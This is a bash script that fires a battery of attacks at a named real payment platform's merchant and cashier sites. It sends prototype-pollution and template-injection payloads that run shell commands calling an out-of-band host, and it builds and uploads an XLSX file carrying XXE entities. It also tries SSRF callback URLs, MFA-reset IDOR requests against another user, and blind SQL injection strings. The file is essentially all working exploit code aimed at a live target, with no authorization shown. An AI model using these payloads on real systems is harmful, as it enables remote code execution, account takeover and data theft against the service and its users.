#!/bin/bash
# OOB Callback Tests — PayCools (merchant.paycools.com)
# Domain: testrce.6u.gg
#
# PayCools confirmed using Lodash _.template() + SheetJS XLSX parser
# Key vectors:
#   1. Prototype pollution via __proto__.sourceURL -> _.template() RCE
#   2. XXE via XLSX upload (SheetJS xl/worksheets/sheet paths found)
#   3. SSRF via Office viewer (view.officeapps.live.com/op/view.aspx?src=)
#   4. MFA bypass via /auth/resetMFA IDOR

# ── CONFIGURE THESE ──
MERCHANT="https://merchant.paycools.com"
CASHIER="https://cashier.paycools.com.ph"
OOB="testrce.6u.gg"
TOKEN="YOUR_JWT_HERE"
MERCHANT_ID="YOUR_MERCHANT_ID"

H1="Authorization: Bearer $TOKEN"
H2="Content-Type: application/json"

echo "=== PayCools OOB Tests (Real Endpoints) ==="
echo "Monitor $OOB for callbacks"
echo ""

# ─────────────────────────────────────────────────────────────
# TEST 1: Prototype Pollution + _.template() sourceURL RCE
# Real endpoints from extracted JS
# ─────────────────────────────────────────────────────────────

echo "--- [1] Prototype Pollution + sourceURL RCE ---"

PP1='{"__proto__":{"sourceURL":"\nreturn require(\"child_process\").exec(\"curl http://'"$OOB"'/pc-proto-1\")//" }}'
PP2='{"constructor":{"prototype":{"sourceURL":"\nreturn require(\"child_process\").exec(\"curl http://'"$OOB"'/pc-proto-2\")//"}}}'
PP3='{"__proto__":{"sourceURL":"\n};return require(\"child_process\").execSync(\"curl http://'"$OOB"'/pc-proto-3\");//"}}'

# Real endpoints from JS extraction
REAL_ENDPOINTS=(
  "/auth/login"
  "/auth/user"
  "/auth/changeMfaStatus"
  "/auth/resetMFA"
  "/auth/diffDevice"
  "/auth/deviceAuthCode"
  "/auth/forget/resetPwd"
  "/auth/getPicVerificationCode"
  "/merchant/async/download/task/list"
)

for ep in "${REAL_ENDPOINTS[@]}"; do
  echo "[PP] POST $MERCHANT$ep"
  curl -sk "$MERCHANT$ep" \
    -X POST -H "$H1" -H "$H2" \
    -d "$PP1" \
    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
done

echo ""
echo "[PP] Testing Vue route-based API paths..."
# Vue routes suggest these API patterns exist
GUESSED_API=(
  "/api/financialManage"
  "/api/transition"
  "/api/onlinePayment"
  "/api/onlinePayout"
  "/api/paymentLink"
  "/api/customerServiceManage"
  "/api/systemManage"
  "/api/vaManage"
  "/api/agentMerchant"
  "/api/master-merchant"
  "/api/qrStand"
  "/api/platform"
  "/api/questionnaire"
  "/detail/payin/linkTrans"
)

for ep in "${GUESSED_API[@]}"; do
  echo "[PP] POST $MERCHANT$ep"
  curl -sk "$MERCHANT$ep" \
    -X POST -H "$H1" -H "$H2" \
    -d "$PP1" \
    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null

  curl -sk "$MERCHANT$ep" \
    -X PUT -H "$H1" -H "$H2" \
    -d "$PP2" \
    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
done

# Also try cashier subdomain
echo ""
echo "[PP] Testing cashier.paycools.com.ph..."
for ep in "/api/payment" "/api/checkout" "/api/transaction" "/api/order"; do
  curl -sk "$CASHIER$ep" \
    -X POST -H "$H2" \
    -d "$PP1" \
    -o /dev/null -w "  [cashier] POST $ep -> HTTP %{http_code}\n" --max-time 10 2>/dev/null
done

# ─────────────────────────────────────────────────────────────
# TEST 2: XXE via XLSX Upload
# SheetJS XLSX parser confirmed (xl/worksheets/sheet paths in JS)
# The /merchant/async/download/task/list suggests file processing
# ─────────────────────────────────────────────────────────────

echo ""
echo "--- [2] XXE via XLSX Upload ---"

# Create malicious XLSX (it's a zip of XML files)
TMPDIR=$(mktemp -d)
mkdir -p "$TMPDIR/xl/worksheets" "$TMPDIR/_rels" "$TMPDIR/xl/_rels"

# [Content_Types].xml with XXE
cat > "$TMPDIR/[Content_Types].xml" << 'XXEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://testrce.6u.gg/pc-xxe-ct">]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
  <Override PartName="/xl/sharedStrings.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sharedStrings+xml"/>
</Types>
XXEOF

# _rels/.rels
cat > "$TMPDIR/_rels/.rels" << 'XXEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>
XXEOF

# xl/_rels/workbook.xml.rels
cat > "$TMPDIR/xl/_rels/workbook.xml.rels" << 'XXEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/sharedStrings" Target="sharedStrings.xml"/>
</Relationships>
XXEOF

# xl/workbook.xml
cat > "$TMPDIR/xl/workbook.xml" << 'XXEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>
</workbook>
XXEOF

# xl/worksheets/sheet1.xml with XXE in cell value
cat > "$TMPDIR/xl/worksheets/sheet1.xml" << 'XXEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://testrce.6u.gg/pc-xxe-sheet">]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1"><c r="A1" t="inlineStr"><is><t>&xxe;</t></is></c></row>
  </sheetData>
</worksheet>
XXEOF

# xl/sharedStrings.xml with XXE
cat > "$TMPDIR/xl/sharedStrings.xml" << 'XXEOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://testrce.6u.gg/pc-xxe-strings">]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
  <si><t>&xxe;</t></si>
</sst>
XXEOF

# Package as XLSX
XLSX_FILE="/tmp/xxe-paycools.xlsx"
cd "$TMPDIR" && zip -r "$XLSX_FILE" . -x "*.DS_Store" 2>/dev/null && cd - >/dev/null

echo "[XXE] Uploading malicious XLSX to various upload endpoints..."

# Try common upload endpoints
UPLOAD_ENDPOINTS=(
  "$MERCHANT/merchant/async/download/task/list"
  "$MERCHANT/api/import"
  "$MERCHANT/api/upload"
  "$MERCHANT/api/merchant/import"
  "$MERCHANT/api/financialManage/import"
  "$MERCHANT/api/transition/import"
  "$MERCHANT/api/transition/upload"
  "$MERCHANT/api/onlinePayment/import"
  "$MERCHANT/api/systemManage/import"
)

for ep in "${UPLOAD_ENDPOINTS[@]}"; do
  echo "  [XXE] POST $ep"
  curl -sk "$ep" \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@$XLSX_FILE;type=application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" \
    -o /dev/null -w "    HTTP %{http_code}\n" --max-time 15 2>/dev/null
done

# Cleanup
rm -rf "$TMPDIR" "$XLSX_FILE"

# ─────────────────────────────────────────────────────────────
# TEST 3: SSRF via Office Online Viewer
# Found: view.officeapps.live.com/op/view.aspx?src=
# If server fetches the src URL before passing to Office = SSRF
# ─────────────────────────────────────────────────────────────

echo ""
echo "--- [3] SSRF via Office Viewer + Other Vectors ---"

echo "[SSRF] Testing document preview/download endpoints..."
curl -sk "$MERCHANT/api/merchant/async/download/task/list" \
  -X POST -H "$H1" -H "$H2" \
  -d "{\"fileUrl\": \"http://$OOB/pc-ssrf-fileurl\", \"merchantId\": \"$MERCHANT_ID\"}" \
  -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null

curl -sk "$MERCHANT/api/financialManage/export" \
  -X POST -H "$H1" -H "$H2" \
  -d "{\"callbackUrl\": \"http://$OOB/pc-ssrf-fin-export\", \"merchantId\": \"$MERCHANT_ID\"}" \
  -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null

# Payment link creation — might accept redirect URLs
echo "[SSRF] Payment link creation..."
curl -sk "$MERCHANT/api/paymentLink" \
  -X POST -H "$H1" -H "$H2" \
  -d "{\"redirectUrl\": \"http://$OOB/pc-ssrf-paylink-redir\", \"callbackUrl\": \"http://$OOB/pc-ssrf-paylink-cb\", \"amount\": 1, \"currency\": \"PHP\", \"merchantId\": \"$MERCHANT_ID\"}" \
  -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null

# Online payment — webhook/notification URLs
echo "[SSRF] Online payment webhook..."
curl -sk "$MERCHANT/api/onlinePayment" \
  -X POST -H "$H1" -H "$H2" \
  -d "{\"notifyUrl\": \"http://$OOB/pc-ssrf-notify\", \"returnUrl\": \"http://$OOB/pc-ssrf-return\", \"merchantId\": \"$MERCHANT_ID\"}" \
  -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null

# Payout — callback
echo "[SSRF] Payout callback..."
curl -sk "$MERCHANT/api/onlinePayout" \
  -X POST -H "$H1" -H "$H2" \
  -d "{\"callbackUrl\": \"http://$OOB/pc-ssrf-payout\", \"merchantId\": \"$MERCHANT_ID\"}" \
  -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null

# QR Stand — might accept image/logo URLs
echo "[SSRF] QR Stand config..."
curl -sk "$MERCHANT/api/qrStand" \
  -X POST -H "$H1" -H "$H2" \
  -d "{\"logoUrl\": \"http://$OOB/pc-ssrf-qr-logo\", \"merchantId\": \"$MERCHANT_ID\"}" \
  -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null

# Cashier subdomain
echo "[SSRF] Cashier subdomain..."
curl -sk "$CASHIER/api/payment/create" \
  -X POST -H "$H2" \
  -d "{\"notifyUrl\": \"http://$OOB/pc-ssrf-cashier\", \"returnUrl\": \"http://$OOB/pc-ssrf-cashier-ret\", \"amount\": \"1\", \"currency\": \"PHP\"}" \
  -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null

# ─────────────────────────────────────────────────────────────
# TEST 4: MFA Bypass via IDOR
# /auth/resetMFA and /auth/changeMfaStatus
# If these don't properly verify ownership = account takeover
# ─────────────────────────────────────────────────────────────

echo ""
echo "--- [4] MFA IDOR Tests ---"

echo "[MFA] Reset MFA for another user..."
curl -sk "$MERCHANT/auth/resetMFA" \
  -X POST -H "$H1" -H "$H2" \
  -d "{\"userId\": \"1\", \"merchantId\": \"$MERCHANT_ID\"}" \
  -w "\n  HTTP %{http_code}\n" --max-time 10 2>/dev/null

echo "[MFA] Change MFA status for another user..."
curl -sk "$MERCHANT/auth/changeMfaStatus" \
  -X POST -H "$H1" -H "$H2" \
  -d "{\"userId\": \"1\", \"status\": false, \"merchantId\": \"$MERCHANT_ID\"}" \
  -w "\n  HTTP %{http_code}\n" --max-time 10 2>/dev/null

echo "[MFA] Device auth bypass..."
curl -sk "$MERCHANT/auth/deviceAuthCodeSuccess" \
  -X POST -H "$H1" -H "$H2" \
  -d "{\"code\": \"000000\", \"userId\": \"1\"}" \
  -w "\n  HTTP %{http_code}\n" --max-time 10 2>/dev/null

# ─────────────────────────────────────────────────────────────
# TEST 5: Direct SSTI in string fields
# ─────────────────────────────────────────────────────────────

echo ""
echo "--- [5] Direct SSTI ---"

SSTI='${require("child_process").exec("curl http://'"$OOB"'/pc-ssti-interp")}'
SSTI2='<%= global.process.mainModule.require("child_process").execSync("curl http://'"$OOB"'/pc-ssti-eval") %>'

for ep in "/auth/login" "/auth/forget/sendResetPwdEmail" "/api/paymentLink" "/detail/payin/linkTrans"; do
  echo "[SSTI] POST $MERCHANT$ep"
  curl -sk "$MERCHANT$ep" \
    -X POST -H "$H2" \
    -d "{\"email\": \"$SSTI\", \"username\": \"$SSTI\", \"password\": \"test\"}" \
    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
done

# ─────────────────────────────────────────────────────────────
# TEST 6: SQLi (time-based blind)
# ─────────────────────────────────────────────────────────────

echo ""
echo "--- [6] SQLi Time-based Blind ---"

# Login endpoint — email field
echo "[SQLi] Login email field..."
curl -sk "$MERCHANT/auth/login" \
  -X POST -H "$H2" \
  -d '{"email":"admin'\''  AND SLEEP(5)-- ","password":"test"}' \
  -o /dev/null -w "  HTTP %{http_code} (>5s=vuln)\n" --max-time 12 2>/dev/null

# Forgot password — email field
echo "[SQLi] Forgot password email..."
curl -sk "$MERCHANT/auth/forget/sendResetPwdEmail" \
  -X POST -H "$H2" \
  -d '{"email":"test'\'' AND SLEEP(5)-- "}' \
  -o /dev/null -w "  HTTP %{http_code} (>5s=vuln)\n" --max-time 12 2>/dev/null

# Transaction search
echo "[SQLi] Transaction search..."
curl -sk "$MERCHANT/api/transition?search=test'%20AND%20SLEEP(5)--" \
  -H "$H1" -o /dev/null -w "  HTTP %{http_code} (>5s=vuln)\n" --max-time 12 2>/dev/null

# Financial management listing
echo "[SQLi] Financial management..."
curl -sk "$MERCHANT/api/financialManage?search=test'%20AND%20SLEEP(5)--" \
  -H "$H1" -o /dev/null -w "  HTTP %{http_code} (>5s=vuln)\n" --max-time 12 2>/dev/null

# Agent merchant listing
echo "[SQLi] Agent merchant..."
curl -sk "$MERCHANT/api/agentMerchant?search=1'%20UNION%20SELECT%20NULL,NULL,NULL--" \
  -H "$H1" -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null

echo ""
echo "=== Done. Check $OOB dashboard ==="
echo ""
echo "Priority callbacks:"
echo "  /pc-proto-*    = Prototype Pollution + RCE (P1)"
echo "  /pc-xxe-*      = XXE via XLSX (P1-P2)"
echo "  /pc-ssti-*     = Template Injection RCE (P1)"
echo "  /pc-ssrf-*     = Server-Side Request Forgery (P2)"
echo "  MFA tests      = Check response bodies for success (P1 if IDOR works)"
echo "  SQLi tests     = Check response time >5s = confirmed (P1)"
